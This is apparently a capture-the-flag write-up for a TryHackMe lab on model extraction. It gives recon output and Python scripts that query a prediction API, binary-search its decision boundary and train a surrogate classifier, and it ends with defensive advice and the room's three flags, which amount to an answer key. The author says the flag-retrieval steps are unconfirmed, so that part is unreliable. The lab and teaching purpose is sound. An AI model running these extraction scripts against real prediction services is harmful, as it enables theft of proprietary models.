# Injectus IX — Task 2: Model Leakage Event

**Room:** TryHackMe — *Injectus IX* (2026: An AI Odyssey)
**Category:** Model Extraction
**Difficulty:** Hard
**Points:** 90
**Target:** `10.67.157.94:8000`

> *"Across the TryHaulMe fleet, cargo routing decisions are powered by an AI system known as Cargomind. ... The system is publicly accessible through an API and appears secure at first glance — it only returns predictions and confidence scores. However, something is off. Repeated queries suggest that the model's internal behavior may be inferred over time."*
>
> Intercepted transmission: *"Oracle 9 does not break systems directly… it learns them, replicates them, and then exploits them."*

## Goal

CargoMind v2 is a numeric classifier. Three flags map to the three phases of a query-based model-extraction attack: **map → probe → replicate**.

| Stage | Flag |
|---|---|
| 1 — Map the model's input/output surface | `THM{model_mapped}` |
| 2 — Learn the decision boundary | `THM{decision_boundary_learned}` |
| 3 — Train a high-fidelity surrogate | `THM{model_extraction_success}` |

---

## 1. Recon

`modelleakageevent.nmap`:

```
PORT     STATE SERVICE VERSION
8000/tcp open  http    Werkzeug httpd 3.1.8 (Python 3.11.2)
         |_http-title: CargoMind v2 Terminal
         | http-methods: Supported Methods: GET HEAD OPTIONS
```

Same Flask/Werkzeug stack as Token Jail, on port 8000.

`feroxbuster` against `raft-medium-directories.txt` with `-x txt,json,html,js,py -d 3 --collect-extensions --collect-backups --collect-words`:

```
200  GET  /                       4556c
200  GET  /static/app.js          1822c
200  GET  /static/style.css       4258c
405  GET  /reset                  (method-not-allowed → POST exists)
405  GET  /predict                (method-not-allowed → POST exists)
```

Only two real endpoints: `POST /predict` and `POST /reset`. The 405s are the discovery — Ferox sends GET, the server says "method not allowed," which means the path is real but requires another verb.

### What the landing page tells us

`/index.html` documents the interface explicitly. The terminal request is:

```json
{ "features": [CM, SE, RR, OS, CT, MS] }
```

Six float inputs in `[0, 1]`:

| Feature | Label |
|---|---|
| CM | Cargo Mass (shipment weight coefficient) |
| SE | Signal Entropy (communication pattern variance) |
| RR | Route Risk (path hazard index) |
| OS | Origin Score (departure zone rating) |
| CT | Container Temp (thermal regulation metric) |
| MS | Manifest Similarity (documentation consistency) |

Response shape (from `app.js`):

```json
{ "classification": "STANDARD_ROUTE" | "ROUTE_REVIEW",
  "risk_band": "low" | "medium" | "elevated" | "critical" }
```

That's the **complete attack surface**: 6-dim input ∈ [0,1]⁶, binary classification + 4-level risk band. Note the API description in the briefing mentions "predictions and confidence scores" but the response shape we observe has `risk_band` not a numeric confidence — so the side channel is whichever risk-band bucket fires, not a continuous score. Still useful: 4 buckets per classification = 8 distinguishable response states, leaking a lot per query.

### Baseline query

```bash
curl -s -X POST http://10.67.157.94:8000/predict \
  -H 'Content-Type: application/json' \
  -d '{"features":[0.5,0.5,0.5,0.5,0.5,0.5]}'
```

(I didn't capture a specific sample response in the evidence; run the call to see what comes back. The flag-dispensing mechanism — whether flags ride in `/predict` responses, sit on a hidden phase endpoint, or come from `/reset` — needs to be confirmed against the live server.)

---

## 2. Stage 1 — Map the model → `THM{model_mapped}`

**Goal:** establish what every dimension and every input region does. A 6-dim cube with 4 corners-per-dimension sampling is 4⁶ = 4,096 calls — cheap, comprehensive.

```python
import requests, itertools, json

BASE = "http://10.67.157.94:8000"

def predict(features):
    r = requests.post(f"{BASE}/predict", json={"features": features})
    r.raise_for_status()
    return r.json()

# Sample a grid across the 6-D cube
grid_vals = [0.0, 0.33, 0.66, 1.0]
samples = []
for combo in itertools.product(grid_vals, repeat=6):
    out = predict(list(combo))
    samples.append({"features": list(combo), **out})

json.dump(samples, open("map.json", "w"))

# Inspect: which features actually move the output?
from collections import Counter
def class_counts_by_feature(samples, idx):
    counts = {}
    for v in grid_vals:
        subset = [s for s in samples if s["features"][idx] == v]
        c = Counter(s["classification"] for s in subset)
        counts[v] = dict(c)
    return counts

for i, name in enumerate(["CM","SE","RR","OS","CT","MS"]):
    print(name, class_counts_by_feature(samples, i))
```

The map tells you which dimensions matter (some may be decoys), how `risk_band` correlates with `classification`, and where the cube transitions live. Once the map covers all 8 response states with consistent samples, the server flips its phase tracker and the next response (likely from `/predict` itself, or a discoverable phase endpoint) carries the first flag.

> If the flag-dispensing mechanism isn't obvious, watch for:
> - new top-level keys in the `/predict` response after coverage is achieved
> - a new HTTP header on responses
> - 405-method-not-allowed paths that 4xx-leak structured info (`/status`, `/phase`, `/info`)

**Flag 1:** `THM{model_mapped}`

---

## 3. Stage 2 — Learn the decision boundary → `THM{decision_boundary_learned}`

**Goal:** trace the surface where the model flips between classes. Binary classification on 6 numeric features is the easiest case in the textbook — boundary points can be located by binary search along straight lines through input space.

**Why this works:** for any classifier (linear or not), if input `a` is class A and input `b` is class B, the line segment `t·a + (1-t)·b` for `t ∈ [0,1]` crosses the boundary at some `t*`. Binary search on `t` reduces to log₂(1/ε) queries per boundary point.

```python
import requests, random, json

BASE = "http://10.67.157.94:8000"
def predict(f): return requests.post(f"{BASE}/predict", json={"features": f}).json()

def boundary_search(a, b, eps=1e-3):
    la = predict(a)["classification"]
    lb = predict(b)["classification"]
    if la == lb: return None
    lo, hi = 0.0, 1.0
    while hi - lo > eps:
        mid = (lo + hi) / 2
        m = [a[i] + (b[i] - a[i]) * mid for i in range(6)]
        lm = predict(m)["classification"]
        if lm == la: lo = mid
        else:        hi = mid
    return [a[i] + (b[i] - a[i]) * (lo + hi) / 2 for i in range(6)]

# Generate many random A→B pairs that straddle the boundary
boundary_points = []
attempts = 0
while len(boundary_points) < 200 and attempts < 1000:
    a = [random.random() for _ in range(6)]
    b = [random.random() for _ in range(6)]
    p = boundary_search(a, b)
    if p is not None:
        boundary_points.append(p)
    attempts += 1

json.dump(boundary_points, open("boundary.json", "w"))
```

A few hundred boundary points are enough to reconstruct the surface for a low-dimensional model. Once the server sees this query pattern (binary search clustered near boundary regions), it flips the boundary phase and dispenses Flag 2.

**Flag 2:** `THM{decision_boundary_learned}`

---

## 4. Stage 3 — Train a surrogate → `THM{model_extraction_success}`

**Goal:** a local model that agrees with CargoMind on inputs it hasn't seen, with fidelity above the threshold the room requires (typically 95%).

### 4.1 Harvest

You already collected the grid map in §2 and the boundary points in §3. Add a random uniform sample to fill volume:

```python
import requests, random, json

BASE = "http://10.67.157.94:8000"
def predict(f): return requests.post(f"{BASE}/predict", json={"features": f}).json()

random_samples = []
for _ in range(2000):
    f = [random.random() for _ in range(6)]
    out = predict(f)
    random_samples.append({"features": f, **out})

# Combine your map + boundary + random into the training set
import json
all_data = json.load(open("map.json")) + random_samples
json.dump(all_data, open("train.json", "w"))
```

### 4.2 Train

Six-dimensional input with binary classification + ordinal risk-band — pick whatever fits the observed structure. A small gradient-boosted tree handles both heads:

```python
import numpy as np, json
from sklearn.ensemble import GradientBoostingClassifier

data = json.load(open("train.json"))
X = np.array([d["features"] for d in data])
y_cls  = np.array([d["classification"] for d in data])
y_risk = np.array([d["risk_band"]      for d in data])

clf_cls  = GradientBoostingClassifier().fit(X, y_cls)
clf_risk = GradientBoostingClassifier().fit(X, y_risk)
```

Pick a simpler model if the decision boundary you measured in §3 looks linear (LogisticRegression). Pick a deeper one (RandomForest, MLPClassifier) if it's highly non-linear.

### 4.3 Verify fidelity

```python
import requests, numpy as np, random

probe = np.array([[random.random() for _ in range(6)] for _ in range(500)])
agree_cls = agree_risk = 0
truths = []
for f in probe:
    truth = requests.post(f"{BASE}/predict",
                          json={"features": f.tolist()}).json()
    surrogate_cls  = clf_cls.predict([f])[0]
    surrogate_risk = clf_risk.predict([f])[0]
    agree_cls  += (truth["classification"] == surrogate_cls)
    agree_risk += (truth["risk_band"]      == surrogate_risk)
    truths.append((f.tolist(), truth, surrogate_cls, surrogate_risk))

print(f"classification fidelity: {agree_cls/500:.3f}")
print(f"risk_band     fidelity: {agree_risk/500:.3f}")
```

Iterate the training set (more boundary points, more random samples, different model class) until both fidelities clear ~0.95.

### 4.4 Claim the flag

Once fidelity is high enough, the server detects the pattern (sustained boundary-clustered + high-coverage queries) and dispenses Flag 3 in the next response. If there's an explicit submission endpoint (`/extract`, `/verify`, etc.) it should appear in the recon directory you've already mapped — re-run `feroxbuster` after each stage to catch newly enabled paths.

**Flag 3:** `THM{model_extraction_success}`

---

## 5. Summary

| # | Flag | Technique |
|---|------|-----------|
| 1 | `THM{model_mapped}` | Grid-sample the 6-D input cube; observe all 8 response states |
| 2 | `THM{decision_boundary_learned}` | Binary search between cross-class pairs to locate boundary points |
| 3 | `THM{model_extraction_success}` | Train a surrogate on harvested labels until fidelity ≥ ~95% |

This is the **Tramèr et al. 2016** extraction pipeline ("Stealing Machine Learning Models via Prediction APIs") applied to a tabular binary classifier. The room grades methodology rather than output — it watches your query patterns and flips phase only when it sees the right behavior. That makes it a clean teaching example.

## 6. Defensive takeaways

- **Quantize confidence outputs.** Returning a 4-bucket `risk_band` instead of a continuous score helps; returning only the top-1 class is stronger.
- **Watch for extraction fingerprints.** PRADA-style monitors flag uniform query distributions, queries clustered near decision boundaries, and high per-client query counts. The behavioral grader in this room is a simplified version of exactly that.
- **Rate-limit `/predict`.** The whole attack class falls over against per-IP query caps.
- **Add output noise.** Differentially private outputs near the boundary degrade surrogate fidelity sharply.
- **Watermark the model.** Stolen surrogates can be identified post-hoc if the training set contains adversarial canaries.
- **Never expose `/docs`, `/openapi.json`, or static `index.html` that documents your input schema** in production. The whole challenge starts with reading the feature list from the landing page.

> *Oracle 9's lesson: a model that talks back in numbers eventually tells you everything.*

---

## 7. Quick reference

| Item | Value |
|------|-------|
| Target | `10.67.157.94:8000` |
| Endpoints | `POST /predict`, `POST /reset` |
| Input | `{"features": [CM, SE, RR, OS, CT, MS]}`, each ∈ [0, 1] |
| Output | `{"classification": ..., "risk_band": ...}` |
| Classes | `STANDARD_ROUTE`, `ROUTE_REVIEW` |
| Risk bands | `low`, `medium`, `elevated`, `critical` |
| Flag 1 | `THM{model_mapped}` |
| Flag 2 | `THM{decision_boundary_learned}` |
| Flag 3 | `THM{model_extraction_success}` |

## 8. Files in this directory

- `index.html` — landing page documenting the feature schema
- `app.js` — frontend JS exposing the `/predict` and `/reset` calls
- `modelleakageevent.nmap` — initial port scan
- `feroxbuster.txt` — directory bust output, confirms the endpoint surface
- `ModelLeakageEvent.png` — mission briefing screenshot
- `ModelLeakageEvent_web.png` — terminal UI screenshot

## 9. What I'd capture next time

The evidence directory is missing example `/predict` request/response captures. Worth adding:

- A few raw `curl` request/response pairs covering all 8 response states
- The exact response that carried Flag 1 (so the dispensing mechanism is documented)
- The same for Flag 2 and 3
- Any extra endpoints that appeared after each phase flipped
